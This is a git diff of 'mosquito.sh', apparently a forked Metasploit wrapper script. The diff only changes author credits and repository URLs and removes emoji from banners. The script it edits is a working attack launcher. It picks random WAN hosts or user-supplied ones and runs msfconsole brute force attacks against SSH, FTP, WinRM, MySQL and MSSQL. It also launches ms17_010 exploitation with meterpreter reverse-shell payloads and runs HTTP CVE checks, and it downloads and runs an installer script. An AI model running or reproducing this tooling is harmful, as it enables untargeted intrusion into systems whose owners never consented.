@@ -1,9 +1,8 @@
 #!/bin/sh
-# Author: r00t-3xp10it
+# Author: r00t-3xp10it, re-worked by ryanmrestivo
 # mosquito framework v:3.14.3 [STABLE]
-# Suspicious Shell Activity - redteam @2019
 # Automate remote brute force tasks over WAN/LAN networks
-# GitHub: https://github.com/r00t-3xp10it/resource_files
+# GitHub: https://github.com/ryanmrestivo/metasploit-resource-files
 # count duplicate lines: cat telnet-default-userpasslist.txt | uniq -c
 ##
 resize -s 38 120 > /dev/nul
@@ -54,20 +53,20 @@ Colors;
 if ! [ -e "logs" ]; then
 echo "---"${BlueF}
 cat << !
-                                                🦟__________       
-              _______🦟________________________  ___(_) _  /______🦟
+                                                 __________       
+              _______ ________________________  ___(_) _  /______ 
            __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
-         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
+           _  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
            /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
-                                     /_/ 🦟                             🦟
+                                     /_/                                
 !
 echo ""${Reset};
 cat << !
         Before we are abble to install/execute mosquito, we need to download
-         🦟mosquito working directory to our machine first and then run it.
+          mosquito working directory to our machine first and then run it.
 
 !
-echo "    ${BlueF}[${YellowF}execute${BlueF}]${white} sudo git clone https://github.com/r00t-3xp10it/resource_files.git"
+echo "    ${BlueF}[${YellowF}execute${BlueF}]${white} sudo git clone https://github.com/ryanmrestivo/metasploit-resource-files.git"
 echo "    ${BlueF}[${YellowF}execute${BlueF}]${white} cd resource_files && sudo chmod +x *.sh"
 echo "    ${BlueF}[${YellowF}execute${BlueF}]${white} sudo ./mosquito.sh -h"
 echo "" && echo "---"
@@ -85,7 +84,7 @@ while getopts ":h,:u,:i," opt; do
         rm -f install.sh > /dev/nul 2>&1
         time=$(date | awk {'print $4'})
         echo "${BlueF}[${YellowF}$time${BlueF}]${white} Downloading/updating installer .."${Reset};sleep 1
-        wget -qq https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/install.sh
+        wget -qq https://raw.githubusercontent.com/ryanmrestivo/metasploit-resource-files/master/aux/install.sh
         chmod +x install.sh
         ./install.sh -u # update (install.sh -u)
         exit
@@ -97,12 +96,12 @@ while getopts ":h,:u,:i," opt; do
         h)
 echo "---"${BlueF}
 cat << !
-                                                🦟__________       
-              _______🦟________________________  ___(_) _  /______🦟
+                                                 __________       
+              _______ ________________________  ___(_) _  /______ 
            __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
-         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
+           _  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
            /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
-                                     /_/ 🦟                             🦟
+                                     /_/                                
 !
 echo ""${Reset};
 echo "${BlueF}    ${RedF}:${BlueF}Framework Description_"${Reset};
@@ -114,9 +113,8 @@ cat << !
 !
 echo "${BlueF}    ${RedF}:${BlueF}Framework Info_"${Reset};
 cat << !
-       Author: r00t-3xp10it
-       Suspicious Shell Activity🦟redteam @2019🦟
-       https://github.com/r00t-3xp10it/resource_files
+       Author: r00t-3xp10it, re-worked by ryanmrestivo
+       https://github.com/ryanmrestivo/metasploit-resource-files
 
 !
 echo "${BlueF}    ${RedF}:${BlueF}Dependencies_"${Reset};
@@ -162,16 +160,16 @@ done
 if ! [ -f "aux/install.log" ]; then
 echo "---"${BlueF}
 cat << !
-                                                🦟__________       
-              _______🦟________________________  __(_)  _  /______🦟
+                                                 __________       
+              _______ ________________________  __(_)  _  /______ 
            __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
-         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
+           _  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
            /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
-                                     /_/ 🦟                             🦟
+                                     /_/                                
 !
 echo ${white}"---${YellowF}               'Mosquito reports that its ${RedF}not${YellowF} installed'."${Reset};
 echo ""
-   echo -n "${BlueF}[${YellowF}i${BlueF}] Do you wish to install 🦟mosquito dependencies now? (y/n):"${Reset};read quer
+   echo -n "${BlueF}[${YellowF}i${BlueF}] Do you wish to install mosquito dependencies now? (y/n):"${Reset};read quer
    if [ "$quer" = "y" ] || [ "$quer" = "Y" ]; then
       cd aux && ./install.sh # install dependencies (install.sh)
    fi
@@ -181,9 +179,9 @@ fi
 
 
 ###################################################################
-#                * 🦟 FRAMEWORK MAIN FUNCTIONS 🦟 *               #
+#                *   FRAMEWORK MAIN FUNCTIONS   *               #
 ###################################################################
-service postgresql start | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+service postgresql start | zenity --progress --pulsate --title " PLEASE WAIT " --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 
 #
 # geo_location funcion
@@ -191,14 +189,14 @@ service postgresql start | zenity --progress --pulsate --title "🦟 PLEASE WAIT
 sh_one () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} geo_location resource_"${Reset};
    sleep 1
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan user inputs (rhosts)" FALSE "Scan user input host list (file.txt)" FALSE "Internal ip addr to external ip Resolver" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title "  MOSQUITO  " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan user inputs (rhosts)" FALSE "Scan user input host list (file.txt)" FALSE "Internal ip addr to external ip Resolver" --width 330 --height 200) > /dev/null 2>&1
    #
    ## Sellect the type of scan to use
    #
    if [ "$scan" = "Scan user inputs (rhosts)" ]; then
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 162.246.22.133 104.96.180.140" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 162.246.22.133 104.96.180.140" --width 450) > /dev/null 2>&1
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
+      packag=$(zenity --list --title " MOSQUITO " --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
          if [ "$packag" = "Curl" ]; then
             echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
             msfconsole -q -x "setg USE_CURL true;setg RHOSTS $rhost;resource geo_location.rc"
@@ -211,8 +209,8 @@ sh_one () {
    #
    elif [ "$scan" = "Scan user input host list (file.txt)" ]; then
       echo "${BlueF}[☠]${white} Scanning User input host list (file.txt)"${Reset};
-      list=$(zenity --title "🦟 MOSQUITO 🦟" --filename=$IPATH --file-selection --text "chose host list to use") > /dev/null 2>&1
-      packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
+      list=$(zenity --title " MOSQUITO " --filename=$IPATH --file-selection --text "chose host list to use") > /dev/null 2>&1
+      packag=$(zenity --list --title " MOSQUITO " --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
          if [ "$packag" = "Curl" ]; then
             echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
             msfconsole -q -x "setg USE_CURL true;setg TXT_IMPORT $list;resource geo_location.rc"
@@ -225,7 +223,7 @@ sh_one () {
    #
    elif [ "$scan" = "Internal ip addr to external ip Resolver" ]; then
       echo "${BlueF}[☠]${white} Resolving Internal ip addr to external ip"${Reset};
-      packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
+      packag=$(zenity --list --title " MOSQUITO " --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
          if [ "$packag" = "Curl" ]; then
             echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
             msfconsole -q -x "setg USE_CURL true;setg RESOLVER true;resource geo_location.rc"
@@ -234,7 +232,7 @@ sh_one () {
             msfconsole -q -x "setg GOOGLE_MAP true;setg RESOLVER true;resource geo_location.rc"
          fi
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -249,7 +247,7 @@ sh_two () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} brute_force resource_"${Reset};
    sleep 1
    IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -262,14 +260,14 @@ sh_two () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 216.15.177.33 162.246.22.133" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 216.15.177.33 162.246.22.133" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;resource brute_force.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for targets"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -282,7 +280,7 @@ sh_two () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;resource brute_force.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -297,8 +295,8 @@ sh_tree () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} ms17_010 resource_"${Reset};
    sleep 1
    IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
-   payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" FALSE "generic/shell_reverse_tcp" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 220) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   payload=$(zenity --list --title " MOSQUITO " --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" FALSE "generic/shell_reverse_tcp" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 220) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -311,14 +309,14 @@ sh_tree () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 46.147.255.230 194.58.118.182" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 46.147.255.230 194.58.118.182" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;setg PAYLOAD $payload;resource ms17_010.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -331,7 +329,7 @@ sh_tree () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;setg PAYLOAD $payload;resource ms17_010.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -345,7 +343,7 @@ sh_main
 sh_quatro () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} ssh_brute resource_"${Reset};
    sleep 1
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -358,14 +356,14 @@ sh_quatro () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 147.162.198.31 41.225.253.172" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 147.162.198.31 41.225.253.172" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;resource ssh_brute.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       ## Make sure the LIMMIT value did not have exceded the max allowed
@@ -377,7 +375,7 @@ sh_quatro () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource ssh_brute.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -392,7 +390,7 @@ sh_cinco () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} ftp_brute resource_"${Reset};
    sleep 1
    IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -405,14 +403,14 @@ sh_cinco () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 143.191.125.117 183.17.237.229" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 143.191.125.117 183.17.237.229" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;resource ftp_brute.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 400 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 400 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -425,7 +423,7 @@ sh_cinco () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource ftp_brute.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -439,7 +437,7 @@ sh_main
 sh_six () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} http_CVE resource_"${Reset};
    sleep 1
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -452,14 +450,14 @@ sh_six () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 154.194.198.245 66.199.38.187" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 154.194.198.245 66.199.38.187" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;resource http_CVE.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -472,7 +470,7 @@ sh_six () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource http_CVE.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -486,8 +484,8 @@ sh_main
 sh_seven () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} winrm_brute resource_"${Reset};
    sleep 1
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
-   payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" FALSE "generic/shell_reverse_tcp" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 220) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   payload=$(zenity --list --title " MOSQUITO " --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" FALSE "generic/shell_reverse_tcp" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 220) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -500,14 +498,14 @@ sh_seven () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 154.208.147.160 205.65.133.91" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 154.208.147.160 205.65.133.91" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;setg PAYLOAD $payload;resource winrm_brute.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 800 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 800 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -520,7 +518,7 @@ sh_seven () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg PAYLOAD $payload;resource winrm_brute.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -534,7 +532,7 @@ sh_main
 sh_oito () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} mysql_brute resource_"${Reset};
    sleep 1
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -547,14 +545,14 @@ sh_oito () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 213.171.197.190 46.242.242.249" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 213.171.197.190 46.242.242.249" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;resource mysql_brute.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -567,7 +565,7 @@ sh_oito () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource mysql_brute.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
@@ -581,7 +579,7 @@ sh_main
 sh_nine () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} mssql_brute resource_"${Reset};
    sleep 1
-   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
+   scan=$(zenity --list --title " MOSQUITO " --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -594,14 +592,14 @@ sh_nine () {
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
-      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 185.99.212.190 180.86.155.12" --width 450) > /dev/null 2>&1
+      rhost=$(zenity --entry --title " MOSQUITO " --text "Input rhosts separated by blank spaces\nExample: 185.99.212.190 180.86.155.12" --width 450) > /dev/null 2>&1
       msfconsole -q -x "setg RHOSTS $rhost;resource mssql_brute.rc"
    #
    # scanning ramdom WAN hosts
    #
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
-      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
+      sealing=$(zenity --entry --title " MOSQUITO " --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
 
       max="1024"
       rm -f 1024 > /dev/nul 2>&1
@@ -614,7 +612,7 @@ sh_nine () {
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource mssql_brute.rc"
    else
-      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
+      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 sh_main
